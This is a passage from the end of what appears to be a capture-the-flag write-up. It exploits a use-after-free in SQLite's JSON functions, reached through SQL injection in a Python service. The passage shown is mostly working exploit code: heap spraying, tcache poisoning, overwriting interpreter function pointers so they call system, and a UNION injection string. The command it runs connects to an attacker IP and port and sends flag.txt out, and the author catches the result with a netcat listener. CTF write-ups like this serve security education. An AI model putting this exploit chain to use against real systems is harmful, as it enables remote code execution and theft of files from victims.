40%)">assert</span><span class="token plain"> request2size</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token builtin" style="color:hsl(119, 34%, 47%)">len</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">data</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token operator" style="color:hsl(221, 87%, 60%)">+</span><span class="token number" style="color:hsl(35, 99%, 36%)">2</span><span class="token operator" style="color:hsl(221, 87%, 60%)">+</span><span class="token number" style="color:hsl(35, 99%, 36%)">1</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&lt;=</span><span class="token plain"> sz</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">	data </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> pad_to_size</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">data</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> sz</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">	</span><span class="token keyword" style="color:hsl(301, 63%, 40%)">return</span><span class="token plain"> malloc_escaped</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">data</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">tcache </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># put cmd in memory</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># 0x93d900 &lt;_PyRuntime+672&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">scratch </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">0x93d900</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">sz </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">0x100</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">cmd </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">f&quot;python3 -c \&quot;import socket;s=socket.socket();s.connect((&#x27;</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">IP</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">&#x27;,</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">PORT</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">));s.send(open(&#x27;flag.txt&#x27;,&#x27;rb&#x27;).read());s.close()\&quot;&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">cmd </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> cmd</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">encode</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">+</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">b&quot;\x00&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">malloc_cmd </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> malloc</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">cmd</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> sz</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">tcache</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token plain">sz</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> scratch</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># overwrite _PyMem_RawFree</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">sz </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">0x70</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">pymem_overwrite </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> flat</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">	</span><span class="token number" style="color:hsl(35, 99%, 36%)">0x00</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> scratch</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">	</span><span class="token number" style="color:hsl(35, 99%, 36%)">0x20</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> python</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">plt</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">system</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">malloc_pymem_overwrite </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> malloc</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">pymem_overwrite</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> sz</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">tcache</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token plain">sz</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">0x90b5e0</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># overwrite PyFunction_Type-&gt;tp_call</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">sz </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">0x80</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># we need to allocate 0x10 bytes earlier to prevent a musable() crash</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">tpcall_overwrite </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> flat</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">	</span><span class="token number" style="color:hsl(35, 99%, 36%)">0x10</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> python</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">sym</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">PyMem_RawFree</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain">		</span><span class="token comment" style="color:hsl(230, 4%, 64%)"># tp_call</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">	</span><span class="token number" style="color:hsl(35, 99%, 36%)">0x38</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">0</span><span class="token plain">								</span><span class="token comment" style="color:hsl(230, 4%, 64%)"># tp_flags</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">malloc_tpcall_overwrite </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> malloc</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">tpcall_overwrite</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> sz</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">tcache</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token plain">sz</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">0x8fba30</span><span class="token plain">	</span><span class="token comment" style="color:hsl(230, 4%, 64%)"># PyFunction_Type+112</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># construct tcache</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">tcache_sizes </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">b&quot;&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">tcache_ptrs </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">b&quot;&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">for</span><span class="token plain"> sz </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">in</span><span class="token plain"> </span><span class="token builtin" style="color:hsl(119, 34%, 47%)">range</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token number" style="color:hsl(35, 99%, 36%)">0x20</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">0x420</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">0x10</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">	</span><span class="token keyword" style="color:hsl(301, 63%, 40%)">if</span><span class="token plain"> sz </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">in</span><span class="token plain"> tcache</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">		tcache_sizes </span><span class="token operator" style="color:hsl(221, 87%, 60%)">+=</span><span class="token plain"> p16</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token number" style="color:hsl(35, 99%, 36%)">1</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">		tcache_ptrs </span><span class="token operator" style="color:hsl(221, 87%, 60%)">+=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">tcache</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token plain">sz</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">	</span><span class="token keyword" style="color:hsl(301, 63%, 40%)">else</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">		tcache_sizes </span><span class="token operator" style="color:hsl(221, 87%, 60%)">+=</span><span class="token plain"> p16</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token number" style="color:hsl(35, 99%, 36%)">0</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">		tcache_ptrs </span><span class="token operator" style="color:hsl(221, 87%, 60%)">+=</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">b&quot;X&quot;</span><span class="token operator" style="color:hsl(221, 87%, 60%)">*</span><span class="token number" style="color:hsl(35, 99%, 36%)">8</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">tcache </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> tcache_sizes </span><span class="token operator" style="color:hsl(221, 87%, 60%)">+</span><span class="token plain"> tcache_ptrs</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">tcache </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> escape</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">tcache</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token number" style="color:hsl(35, 99%, 36%)">0x280</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">malloc_tcache </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> malloc_escaped</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">tcache</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">long_list </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string" style="color:hsl(119, 34%, 47%)">&quot;[&quot;</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">+</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">&quot;,&quot;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">join</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token string" style="color:hsl(119, 34%, 47%)">&quot;null&quot;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token operator" style="color:hsl(221, 87%, 60%)">*</span><span class="token number" style="color:hsl(35, 99%, 36%)">0x30</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">+</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">&quot;]&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">json </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">f&quot;json_set(&#x27;{{}}&#x27;, &#x27;$.a&#x27;, json(&#x27;1&#x27;), &#x27;$.b&#x27;, json(&#x27;2&#x27;), &#x27;$.c&#x27;, json(&#x27;3&#x27;), &#x27;$.d&#x27;, json(&#x27;</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">long_list</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">&#x27;))&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">statements </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">statements</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">extend</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">sprays</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">statements</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">append</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string" style="color:hsl(119, 34%, 47%)">&quot;SELECT &quot;</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">+</span><span class="token plain"> json</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">statements</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">append</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">malloc_tcache</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">statements</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">append</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">malloc_cmd</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">statements</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">append</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">malloc_pymem_overwrite</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">statements</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">append</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">malloc_tpcall_overwrite</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">statements</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">append</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string" style="color:hsl(119, 34%, 47%)">&quot;SELECT 1=LIKE(&#x27;ABCDEFG&#x27;,UPPER(HEX(RANDOMBLOB(200000000/2))))&quot;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">injection </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">&quot; UNION &quot;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">join</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token string" style="color:hsl(119, 34%, 47%)">&quot;aaaa&#x27;)&quot;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">+</span><span class="token plain"> statements</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">+</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">&quot;--&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">print</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">injection</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><br></span></code></pre></div></div>
<p>To receive the reverse shell I chose to spin up a digitalocean instance, and setup a netcat listener. Let&#x27;s fire away!</p>
<figure><img src="/assets/image (203).png" alt=""><figcaption><p>Sending the payload</p></figcaption></figure>
<figure><img src="/assets/image (205).png" alt=""><figcaption><p>Receiving the flag</p></figcaption></figure></div></article><nav class="docusaurus-mt-lg pagination-nav" aria-label="Docs pages"><a class="pagination-nav__link pagination-nav__link--prev" href="/ctf-writeups/corctf-2024/format-string"><div class="pagination-nav__sublabel">Previous</div><div class="pagination-nav__label">format-string</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/category/dicectf-2025"><div class="pagination-nav__sublabel">Next</div><div class="pagination-nav__label">diceCTF 2025</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#introduction" class="table-of-contents__link toc-highlight">Introduction</a></li><li><a href="#reversing" class="table-of-contents__link toc-highlight">Reversing</a><ul><li><a href="#sql-injection" class="table-of-contents__link toc-highlight">SQL injection</a></li><li><a href="#where-s-the-pwn" class="table-of-contents__link toc-highlight">Where&#39;s the pwn?</a></li></ul></li><li><a href="#sqlite3-and-json" class="table-of-contents__link toc-highlight">sqlite3 and JSON</a><ul><li><a href="#json_set" class="table-of-contents__link toc-highlight">json_set</a></li><li><a href="#struct-jsonparse" class="table-of-contents__link toc-highlight">struct JsonParse</a></li><li><a href="#jsonparsecached" class="table-of-contents__link toc-highlight">jsonParseCached</a></li><li><a href="#jsonreplacenode" class="table-of-contents__link toc-highlight">jsonReplaceNode</a></li></ul></li><li><a href="#the-uaf" class="table-of-contents__link toc-highlight">The UAF</a><ul><li><a href="#so-what-now" class="table-of-contents__link toc-highlight">So what now?</a></li><li><a href="#data-spraying" class="table-of-contents__link toc-highlight">Data Spraying</a></li><li><a href="#smashing-tcache" class="table-of-contents__link toc-highlight">Smashing tcache</a></li><li><a href="#write-what-where" class="table-of-contents__link toc-highlight">Write what where</a></li><li><a href="#one-gadgets-in-python" class="table-of-contents__link toc-highlight">One gadgets in python?</a></li><li><a href="#overwriting-a-class-method" class="table-of-contents__link toc-highlight">Overwriting a class method</a></li><li><a href="#more-crashes" class="table-of-contents__link toc-highlight">More crashes</a></li></ul></li><li><a href="#solution" class="table-of-contents__link toc-highlight">Solution</a></li></ul></div></div></div></div></main></div></div></div></div>
</body>
</html>